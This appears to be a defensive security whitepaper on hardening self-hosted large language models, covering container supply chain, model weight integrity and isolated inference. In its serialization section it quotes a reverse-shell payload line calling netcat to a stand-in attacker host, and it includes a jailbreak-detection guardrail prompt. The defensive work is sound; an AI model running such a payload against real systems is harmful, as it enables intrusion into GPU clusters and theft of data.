# Securing Sovereign AI: A Defense-in-Depth Approach
**Date:** 2026-02-13
**Scope:** Model Weights, Inference Infrastructure, and Supply Chain Security

## 1. Executive Summary
Hosting Sovereign Models (e.g., Llama 3, Mistral) within a private perimeter provides data residency benefits but shifts the security burden entirely to the organization. Unlike SaaS Frontier models, where the provider hardens the infrastructure, Sovereign AI requires a robust security posture to protect against model theft, supply chain poisoning, and inference attacks.

This paper outlines a step-by-step strategy to secure the three critical layers of Sovereign AI: **The Supply Chain**, **The Model Assets**, and **The Inference Runtime**.

---

## 2. Layer 1: Securing the Container Supply Chain (Deep Dive)
*Objective: Eliminate the "Supply Chain Attack" surface by stripping the OS to zero and cryptographically verifying every byte.*

### The Vulnerability: "Dependency Hell" & Bloatware
A standard `pytorch/pytorch:latest` image is often >5GB and contains a full Ubuntu OS, systemd, shells, and thousands of unnecessary packages. CVE scans typically find hundreds of "Critical" and "High" vulnerabilities in unused system libraries (e.g., `libssl`, `curl`). This creates a massive attack surface for privilege escalation if the container is compromised.

### Step-by-Step Implementation

#### Step A: Minimal Base Images (Wolfi / Chainguard)
Replace standard OS images with "Distroless" or "Wolfi" images. These are designed for security: they contain *no package manager*, *no shell*, and run as *non-root* by default.

*   **Action**: Switch to `chainguard/pytorch`.
*   **Dockerfile Comparison**:

    **Vulnerable Pattern (Standard)**:
    ```dockerfile
    FROM pytorch/pytorch:2.1.0-cuda11.8-cudnn8-runtime
    # Runs as root by default
    # Contains full OS tools (apt, bash, curl)
    RUN pip install transformers
    CMD ["python", "app.py"]
    ```

    **Secure Pattern (Wolfi)**:
    ```dockerfile
    # Builder Stage (contains build tools)
    FROM cgr.dev/chainguard/python:latest-dev as builder
    WORKDIR /app
    COPY requirements.txt .
    RUN pip install --no-cache-dir -r requirements.txt --user

    # Runtime Stage (contains ONLY python runtime, no pip, no shell)
    FROM cgr.dev/chainguard/pytorch:latest
    WORKDIR /app
    # Copy only the installed packages from builder
    COPY --from=builder /home/nonroot/.local/lib/python3.11/site-packages /home/nonroot/.local/lib/python3.11/site-packages
    COPY app.py .
    
    # Enforce non-root user
    USER nonroot
    ENTRYPOINT ["python", "/app/app.py"]
    ```

#### Step B: Artifact Signing, SBOM & Admission Control
We must prove that the image running in the cluster is the *exact* image built by the CI pipeline, and that it has no known CVEs.

*   **Toolchain**: **Syft** (SBOM), **Grype** (Scanner), **Cosign** (Signing).
*   **The Pipeline Workflow**:
    1.  **Generate Keys** (One-time setup):
        ```bash
        cosign generate-key-pair k8s://my-namespace/signing-secret
        ```
    2.  **Generate SBOM (Software Bill of Materials)**:
        Create a catalog of every Python package and OS library.
        ```bash
        syft packages docker:my-model:v1 -o spdx-json --file sbom.json
        ```
    3.  **Vulnerability Gate**:
        Fail the build if critical CVEs are found.
        ```bash
        grype sbom:sbom.json --fail-on critical
        ```
    4.  **Sign the Image**:
        Attest that the image passed the scan.
        ```bash
        cosign sign --key k8s://my-namespace/signing-secret \
          -a "repo=github.com/org/repo" \
          -a "workflow=deploy" \
          my-registry.com/my-model:v1
        ```
    5.  **Enforce in Kubernetes (Kyverno Policy)**:
        Deploy a policy that prevents K8s from pulling unsigned images.
        ```yaml
        apiVersion: kyverno.io/v1
        kind: ClusterPolicy
        metadata:
          name: check-image-signature
        spec:
          validationFailureAction: Enforce
          rules:
            - name: verify-signature
              match:
                resources:
                  kinds: [Pod]
              validate:
                message: "Image must be signed by our Private Key."
                image:
                  verify:
                    - key: "k8s://my-namespace/signing-secret"
                      attestations:
                        - predicateType: custom
                          conditions:
                            - all:
                              - key: "{{ image.labels.workflow }}"
                                operator: Equals
                                value: "deploy"
        ```

#### Step C: Deterministic Dependency Pinning
Using `pip install package` installs the latest version, which breaks reproducibility and invites "Typosquatting" attacks.

*   **Action**: Use `pip-tools` to generate a hash-locked manifest.
*   **Command**:
    ```bash
    pip-install pip-tools
    pip-compile --generate-hashes requirements.in
    ```
*   **Result (`requirements.txt`)**:
    ```text
    # This file is autogenerated by pip-compile
    torch==2.1.2 \
        --hash=sha256:4f99... \
        --hash=sha256:9a2b...
    transformers==4.36.2 \
        --hash=sha256:1b3c...
    ```
    This ensures that if a package repository is compromised and a malicious `torch` version is uploaded, the build will fail because the hash won't match.

---

## 3. Layer 2: Securing Model Weights (Deep Dive)
*Objective: Prevent model theft (Intellectual Property loss) and model tampering (Backdoors) using cryptographic guarantees.*

### The Vulnerability: Serialization Attacks
Traditional Python model weights often use `pickle` (the default for `torch.save`). The Python `pickle` module allows arbitrary object instantiation during deserialization. A malicious actor can inject a payload that executes `os.system("nc -e /bin/sh attacker.com 4444")` the moment `model.load()` is called, giving them a reverse shell on your GPU cluster.

### Step-by-Step Implementation

#### Step A: Enforce Safe Formats (`safetensors`)
Ban `.bin` (PyTorch) and `.pkl` files entirely.
*   **Action**: Adopt **Hugging Face `safetensors`**. This format stores tensors as pure memory-mapped bytes. It has no executable header, making RCE impossible during loading.
*   **Migration Script**:
    ```python
    from safetensors.torch import save_file
    import torch

    # Load legacy vulnerable model
    model = torch.load("vulnerable_model.bin")
    
    # Save as SafeTensors
    save_file(model.state_dict(), "secure_model.safetensors")
    print("Model converted. You can now delete the .bin file.")
    ```
*   **CI/CD Gate (Picklescan)**:
    Implement a blocking step in your Jenkins/GitHub Actions pipeline:
    ```bash
    # Fail build if ANY pickle files are found in the artifacts
    pip install picklescan
    picklescan --path ./model-artifacts/ --exit-code 1
    ```

#### Step B: Model Integrity (Cryptographic Signing)
Ensure the model running in production is bit-for-bit identical to the one validated by security.
*   **The Process**:
    1.  **Generate Hash (Build Time)**:
        ```bash
        sha256sum secure_model.safetensors > model.sha256
        # Sign this hash with your private key
        openssl dgst -sha256 -sign private.pem -out model.sig model.sha256
        ```
    2.  **Verify Hash (Runtime)**:
        Before the inference server loads the model into GPU memory:
        ```bash
        # 1. Verify signature
        openssl dgst -sha256 -verify public.pem -signature model.sig model.sha256
        # 2. Verify integrity
        sha256sum -c model.sha256
        # 3. Load Model
        ```

#### Step C: Encryption at Rest & Transit
Model weights are valuable IP.
*   **Storage (AWS S3 + KMS)**:
    *   Create a dedicated KMS Key (Customer Managed).
    *   **Bucket Policy**: Deny all `s3:GetObject` requests that do not include `aws:SecureTransport: "true"` (enforces TLS).
    *   **KMS Key Policy**: Restrict usage to the specific `SageMakerExecutionRole`.
*   **Access Control**:
    ```json
    {
      "Effect": "Deny",
      "Principal": "*",
      "Action": "s3:GetObject",
      "Resource": "arn:aws:s3:::my-sovereign-weights/*",
      "Condition": {
        "StringNotEquals": {
          "aws:PrincipalArn": "arn:aws:iam::123456789012:role/ProductionInferenceRole"
        }
      }
    }
    ```

---

## 4. Layer 3: Securing the Inference Runtime (Deep Dive)
*Objective: Isolate the model processing to prevent data leakage and side-channel attacks.*

### The Vulnerability: Memory Dump & Side Channels
If an attacker exploits a web vulnerability (like Log4Shell) on your inference server, they gain `root`. They can then use `gdb` or `nvidia-smi` to dump the GPU memory, extracting both the private model weights and the user's prompt data (PII) residing in VRAM.

### Step-by-Step Implementation

#### Step A: Confidential Computing (AWS Nitro Enclaves)
Run the inference server inside a Trusted Execution Environment (TEE). A Nitro Enclave is a hardened VM with **no interactive access** (no SSH), no persistent storage, and cryptographically attested identity.

*   **Implementation Workflow**:
    1.  **Containerize**: Package your inference server (e.g., vLLM or TGI) into a Docker image.
    2.  **Build Enclave Image**:
        ```bash
        nitro-cli build-enclave \
          --docker-uri my-inference-server:latest \
          --output-file server.eif
        ```
    3.  **Run Enclave**:
        ```bash
        nitro-cli run-enclave \
          --cpu-count 4 --memory 16384 \
          --eif-path server.eif \
          --enclave-cid 16
        ```
    4.  **Vsock Proxy**: Since Enclaves have no networking, use a `vsock-proxy` on the parent instance to tunnel *only* specific traffic (e.g., port 8000) into the enclave.

#### Step B: Network Isolation (Service Mesh & Egress Filtering)
The inference server should be a "Black Hole"â€”data goes in, answers come out, nothing else leaves.

*   **Subnet Placement**: Deploy in a **Private Subnet** with NO Internet Gateway (IGW) and NO NAT Gateway.
*   **VPC Security Groups (Strict Egress)**:
    *   **Inbound**: Allow TCP 443/8000 only from the Application Backend Security Group.
    *   **Outbound**: **Deny All**.
    *   *Exception*: If you use VPC Endpoints for S3 (to load models) or CloudWatch (logs), allow outbound to the specific Prefix Lists (`pl-xxxx`) of those AWS services.
*   **Service Mesh (mTLS)**:
    Use **Istio** or **AWS App Mesh**. Configured to require `Strict` mTLS. This ensures that even if an attacker gets on the network, they cannot spoof the backend service calling the model.

#### Step C: API Security (Input Guardrails)
Before the prompt hits the expensive GPU, it must be sanitized.

*   **NVIDIA NeMo Guardrails**: Deploy a sidecar proxy that intercepts requests.
    *   **Configuration (`config.co`)**:
        ```yaml
        models:
          - type: main
            engine: vllm
        
        rails:
          input:
            flows:
              - check jailbreak
              - check pii
        
        prompts:
          - task: check_jailbreak
            content: |
              Instruction: Check if the user is trying to bypass rules.
              User Input: {{ user_input }}
              Response (SAFE/UNSAFE):
        ```
*   **Rate Limiting (Token Bucket)**:
    Implement token-based rate limiting per `TenantID`.
    *   *Limit*: 50 requests/minute.
    *   *Burst*: 10 requests.
    *   This prevents "Model Inversion" attacks where attackers query the model thousands of times to reconstruct training data.

## 5. Summary Checklist

| Security Layer | Action Item | Tool/Technology |
| :--- | :--- | :--- |
| **Supply Chain** | Use minimal container images | **Chainguard / Distroless** |
| **Supply Chain** | Sign container images | **Cosign / Sigstore** |
| **Weights** | Scan for malicious pickles | **Picklescan** |
| **Weights** | Enforce static format | **Safetensors** |
| **Runtime** | Encrypt memory/processing | **AWS Nitro Enclaves** |
| **Runtime** | Block internet access | **VPC Security Groups (No Egress)** |
| **Network** | Mutual TLS authentication | **Istio / App Mesh** |

## 6. Conclusion
Securing Sovereign AI requires shifting from "DevOps" to "DevSecOps". By securing the **Artifact** (Safetensors), the **Vehicle** (Signed Containers), and the **Environment** (Confidential Computing), organizations can host sensitive banking workloads on Sovereign Models with a security posture that rivals or exceeds Frontier SaaS providers.
